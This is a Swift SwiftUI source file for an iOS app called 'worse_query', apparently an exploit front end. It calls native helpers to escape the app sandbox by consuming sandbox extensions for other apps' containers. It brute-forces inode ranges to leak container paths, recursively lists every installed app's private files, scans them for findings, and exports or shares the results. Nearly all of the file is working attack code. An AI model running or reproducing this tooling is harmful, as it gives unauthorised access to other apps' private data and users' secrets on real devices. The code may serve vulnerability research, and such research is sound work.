//
//  ContentView.swift
//  worse_query
//
//  Created by Taj C on 8/20/26.
//

import SwiftUI

struct ContentView: View {
    @StateObject private var console = Console()
    @State private var sandboxHandle: Int64?
    @State private var path = "/private/var/mobile/Containers/Data/Application/"
    @State private var findings: [Finding] = []
    @State private var reportURL: URL?
    @State private var showShareSheet = false
    @State private var containers: [AppContainer] = []
    @State private var showBrowser = false
    @State private var scanning = false
    
    var body: some View {
        NavigationStack {
            Form {
                Section("Target Path") {
                    TextField("Target", text: $path)
                }
                .disabled(sandboxHandle ?? -255 > 0)
                .disableAutocorrection(true)
                .textInputAutocapitalization(.never)
                
                Section("Escape") {
                    Button("Consume Sandbox Extension") {
                        sandboxHandle = consumeExtension(path)
                    }
                    .disabled(path.isEmpty)
                    .disabled(sandboxHandle ?? -255 > 0)
                    
                    Button("Release Sandbox Extension") {
                        releaseExtension(sandboxHandle ?? -255)
                        sandboxHandle = -255
                    }
                    .disabled(sandboxHandle ?? -255 < 0)
                }
                
                Section("Utilities") {
                    ShareLink(item: URL(fileURLWithPath: path)) {
                        Text("Share Contents")
                    }
                }
                .disabled(path.isEmpty)
                
                Section("Enumeration") {
                    // Reliable, but insanely slow
                    Button("Get Paths (pathleak)") {
                        leakPaths(path)
                    }
                    // Only works on directories that can get a parent directory extension (AppGroup and System on 27.x)
                    Button("Get Paths (parentdir)") {
                        listPaths(path)
                    }
                    Button("Auto Scan All Apps") {
                        findings = []
                        autoScan()
                    }
                    Button(scanning ? "Scanning…" : "Browse Files") {
                        containers = []
                        scanForBrowser()
                    }
                    .disabled(scanning)
                    if !containers.isEmpty {
                        NavigationLink("Open Browser (\(containers.count) apps)") {
                            AppBrowserView(containers: $containers)
                        }
                    }
                 }
                .disabled(path.isEmpty)

                if !findings.isEmpty {
                    Section("Findings (\(findings.count))") {
                        let sorted = findings.sorted { $0.severity > $1.severity }
                        ForEach(sorted) { f in
                            VStack(alignment: .leading, spacing: 2) {
                                Text("[\(f.severity.rawValue)] \(f.bundleId)")
                                    .font(.system(.caption, design: .monospaced))
                                    .bold()
                                Text("\(f.type.rawValue): \(f.key)")
                                    .font(.system(.caption2, design: .monospaced))
                                    .foregroundColor(.secondary)
                            }
                        }
                        Button("Export JSON") {
                            reportURL = exportFindings(findings)
                            showShareSheet = reportURL != nil
                        }
                    }
                    .sheet(isPresented: $showShareSheet) {
                        if let url = reportURL {
                            ShareSheet(url: url)
                        }
                    }
                }
                
                Section("Log") {
                    ScrollViewReader { proxy in
                        ScrollView {
                            Text(console.output)
                                .font(.system(.footnote, design: .monospaced))
                                .textSelection(.enabled)
                                .fixedSize(horizontal: false, vertical: true)
                                .frame(maxWidth: .infinity, alignment: .leading)
                                .id("bottom")
                        }
                        .frame(height: 240)
                        .onChange(of: console.output) { _, _ in
                            withAnimation {
                                proxy.scrollTo("bottom", anchor: .bottom)
                            }
                        }
                    }
                    Button("Clear") {
                        console.output = ""
                        print("hello (again)")
                    }
                }
            }
            .navigationTitle("worse_query")
            .navigationBarTitleDisplayMode(.inline)
            .onAppear() {
                console.start()
            }
        }
    }
    
    func leakPaths(_ filter: String) {
        let files = FileManager.default
        // Use App Group container for baseline — same inode range as other app containers
        let groupRoot = files.containerURL(forSecurityApplicationGroupIdentifier: "group.com.xb.wqtest")
        let baseDir = groupRoot ?? files.temporaryDirectory
        let baselineURL = baseDir.appendingPathComponent(".baseline_\(UUID().uuidString)")
        var baselineInode: UInt64 = 0
        do {
            try "helloworld".write(to: baselineURL, atomically: true, encoding: .utf8)
            var baselineInfo = stat()
            let baselinePath = baselineURL.path

            if stat(baselinePath, &baselineInfo) == 0 {
                baselineInode = baselineInfo.st_ino
                print("baseline: \(baselineInode) (from \(baseDir.lastPathComponent))")
            } else {
                print("Failed to get baseline inode!")
            }

            try files.removeItem(at: baselineURL)
        } catch {
            print("Failed to get baseline inode: \(error)")
            return
        }
        
        DispatchQueue.global(qos: .userInitiated).async {
            let window: UInt64 = 2_000_000
            let minRecent = baselineInode > window ? baselineInode - window : 1

            func scanRange(_ lo: UInt64, _ hi: UInt64) {
                let paths = pathleak_range(filter, lo, hi) ?? []
                for path in paths {
                    let isAppGroup = path.contains("/var/mobile/Containers/Shared/AppGroup")
                    let needsWorkaround = isAppGroup && ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26
                    let handle = worse_query(path, "group.com.xb.wqtest", needsWorkaround, false)
                    if handle > 0 {
                        var buf = [CChar](repeating: 0, count: 512)
                        let len = getxattr(path, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
                        if len > 0 {
                            let bundleID = String(cString: buf)
                            DispatchQueue.main.async {
                                print()
                                print(bundleID + ": " + path)
                                print()
                            }
                        }
                        worse_query_release(handle)
                    }
                }
            }

            // Pass 1: recent inodes (fast, catches newly-installed apps)
            scanRange(minRecent, baselineInode)

            // Pass 2: older inodes in 5M chunks
            if minRecent > 1 {
                var hi = minRecent - 1
                let chunk: UInt64 = 5_000_000
                while hi > 0 {
                    let lo = hi > chunk ? hi - chunk + 1 : 1
                    scanRange(lo, hi)
                    if lo == 1 { break }
                    hi = lo - 1
                }
            }
            DispatchQueue.main.async { print("--- done ---") }
        }
    }
    
    func listPaths(_ path: String) {
        let handle = consumeExtension(path)
        if handle < 0 {
            print("Failed to get parent directory extension!")
            return
        }
        
        let files = FileManager.default
        let root = URL(filePath: path)
        
        var collected: [String] = []
        
        do {
            let enumerated = try files.contentsOfDirectory(at: root, includingPropertiesForKeys: [.isDirectoryKey], options: [.skipsHiddenFiles])
            
            for fileURL in enumerated {
                let resourceValues = try fileURL.resourceValues(forKeys: [.isDirectoryKey])
                if resourceValues.isDirectory == true {
                    collected.append(fileURL.path)
                }
            }
        } catch {
            print("Failed to load enumerate directories!")
        }
        
        for path in collected {
            print(path)
            var buf = [CChar](repeating: 0, count: 512)
            let len = getxattr(path, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
            if len > 0 {
                let bundleID = String(cString: buf)
                print()
                print(bundleID + ": " + path)
                print()
            }
        }
        
        releaseExtension(handle)
    }
    
    func consumeExtension(_ path: String) -> Int64 {
        if sandboxHandle ?? -255 > 0 {
            print("already consumed sandbox token!")
            return sandboxHandle ?? -255
        }
        
        var handle: Int64 = -255
        if path.contains("/var/mobile/Containers/Shared/AppGroup") && ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26 {
            handle = worse_query(path, "group.com.xb.wqtest", true, false)
        } else {
            handle = worse_query(path, "group.com.xb.wqtest", false, false)
        }
        switch handle {
        case -1:
            print("failed to access group!")
        case -2:
            print("failed to resolve functions!")
        case -3:
            print("failed to create query!")
        case -4:
            print("failed to create symlink!")
        case -5:
            print("query rejected!")
        case -6:
            print("kernel refused extension issue!")
        case -255:
            print("target doesn't exist!")
        default:
            print("handle: \(handle)")
        }
        return handle
    }

    func scanForBrowser() {
        scanning = true
        let scanRoot = "/private/var/mobile/Containers/Data/Application/"
        DispatchQueue.global(qos: .userInitiated).async {
            let fm = FileManager.default
            let groupRoot = fm.containerURL(forSecurityApplicationGroupIdentifier: "group.com.xb.wqtest")
            let baseDir = groupRoot ?? fm.temporaryDirectory
            let baselineURL = baseDir.appendingPathComponent(".bl2_\(UUID().uuidString)")
            var baselineInode: UInt64 = 0
            do {
                try "x".write(to: baselineURL, atomically: true, encoding: .utf8)
                var info = stat()
                if stat(baselineURL.path, &info) == 0 { baselineInode = info.st_ino }
                try fm.removeItem(at: baselineURL)
            } catch {
                DispatchQueue.main.async { scanning = false }
                return
            }

            func processRange(_ lo: UInt64, _ hi: UInt64) {
                let paths = pathleak_range(scanRoot, lo, hi) ?? []
                for containerPath in paths {
                    let isAppGroup = containerPath.contains("/Shared/AppGroup")
                    let needsWorkaround = isAppGroup && ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26
                    let handle = worse_query(containerPath, "group.com.xb.wqtest", needsWorkaround, false)
                    guard handle > 0 else { continue }

                    var buf = [CChar](repeating: 0, count: 512)
                    let len = getxattr(containerPath, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
                    let bundleId = len > 0 ? String(cString: buf) : "unknown.\(containerPath.suffix(8))"

                    var entries: [FileEntry] = []
                    listFiles(root: containerPath, current: containerPath, entries: &entries, depth: 8)

                    worse_query_release(handle)

                    if !entries.isEmpty {
                        let app = AppContainer(bundleId: bundleId, containerPath: containerPath, files: entries)
                        DispatchQueue.main.async {
                            self.containers.append(app)
                            print("\(bundleId): \(entries.count) files")
                        }
                    }
                }
            }

            let window: UInt64 = 2_000_000
            let minRecent = baselineInode > window ? baselineInode - window : 1
            processRange(minRecent, baselineInode)
            if minRecent > 1 {
                var hi = minRecent - 1
                let chunk: UInt64 = 5_000_000
                while hi > 0 {
                    let lo = hi > chunk ? hi - chunk + 1 : 1
                    processRange(lo, hi)
                    if lo == 1 { break }
                    hi = lo - 1
                }
            }
            DispatchQueue.main.async {
                self.scanning = false
                self.showBrowser = true
                print("--- browse scan done: \(self.containers.count) apps ---")
            }
        }
    }

    func listFiles(root: String, current: String, entries: inout [FileEntry], depth: Int) {
        guard depth > 0 else { return }
        let fm = FileManager.default
        guard let items = try? fm.contentsOfDirectory(atPath: current) else { return }
        for item in items {
            let full = current + "/" + item
            let rel  = String(full.dropFirst(root.count + 1))
            var isDir: ObjCBool = false
            fm.fileExists(atPath: full, isDirectory: &isDir)
            if isDir.boolValue {
                listFiles(root: root, current: full, entries: &entries, depth: depth - 1)
            } else {
                let size = (try? fm.attributesOfItem(atPath: full)[.size] as? Int64) ?? 0
                entries.append(FileEntry(relativePath: rel, absolutePath: full, size: size))
            }
        }
    }

    func autoScan() {
        let scanRoot = "/private/var/mobile/Containers/Data/Application/"
        DispatchQueue.global(qos: .userInitiated).async {
            let files = FileManager.default
            let groupRoot = files.containerURL(forSecurityApplicationGroupIdentifier: "group.com.xb.wqtest")
            let baseDir = groupRoot ?? files.temporaryDirectory
            let baselineURL = baseDir.appendingPathComponent(".bl_\(UUID().uuidString)")
            var baselineInode: UInt64 = 0
            do {
                try "x".write(to: baselineURL, atomically: true, encoding: .utf8)
                var info = stat()
                if stat(baselineURL.path, &info) == 0 { baselineInode = info.st_ino }
                try files.removeItem(at: baselineURL)
            } catch { return }

            DispatchQueue.main.async { print("auto scan baseline: \(baselineInode)") }

            func scanRange(_ lo: UInt64, _ hi: UInt64) {
                let paths = pathleak_range(scanRoot, lo, hi) ?? []
                for containerPath in paths {
                    let isAppGroup = containerPath.contains("/Shared/AppGroup")
                    let needsWorkaround = isAppGroup && ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26
                    let handle = worse_query(containerPath, "group.com.xb.wqtest", needsWorkaround, false)
                    guard handle > 0 else { continue }

                    var buf = [CChar](repeating: 0, count: 512)
                    let len = getxattr(containerPath, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
                    let bundleId = len > 0 ? String(cString: buf) : "unknown"

                    let newFindings = ContainerScanner.scan(containerPath: containerPath, bundleId: bundleId)

                    worse_query_release(handle)

                    if !newFindings.isEmpty {
                        DispatchQueue.main.async {
                            print("\(bundleId): \(newFindings.count) finding(s)")
                            self.findings.append(contentsOf: newFindings)
                        }
                    }
                }
            }

            let window: UInt64 = 2_000_000
            let minRecent = baselineInode > window ? baselineInode - window : 1
            scanRange(minRecent, baselineInode)

            if minRecent > 1 {
                var hi = minRecent - 1
                let chunk: UInt64 = 5_000_000
                while hi > 0 {
                    let lo = hi > chunk ? hi - chunk + 1 : 1
                    scanRange(lo, hi)
                    if lo == 1 { break }
                    hi = lo - 1
                }
            }
            DispatchQueue.main.async { print("--- auto scan done: \(self.findings.count) total findings ---") }
        }
    }

    func exportFindings(_ findings: [Finding]) -> URL? {
        let encoder = JSONEncoder()
        encoder.outputFormatting = [.prettyPrinted, .sortedKeys]
        guard let data = try? encoder.encode(findings) else { return nil }
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyyMMdd-HHmmss"
        let name = "scan-\(formatter.string(from: Date())).json"
        let url = docs.appendingPathComponent(name)
        try? data.write(to: url)
        return url
    }

    func releaseExtension(_ handle: Int64) {
        if handle < 0 {
            print("sandbox extension hasn't been consumed!")
            return
        }
        worse_query_release(handle)
        print("released sandbox extension!")
    }
}

import UIKit

struct ShareSheet: UIViewControllerRepresentable {
    let url: URL
    func makeUIViewController(context: Context) -> UIActivityViewController {
        UIActivityViewController(activityItems: [url], applicationActivities: nil)
    }
    func updateUIViewController(_ vc: UIActivityViewController, context: Context) {}
}
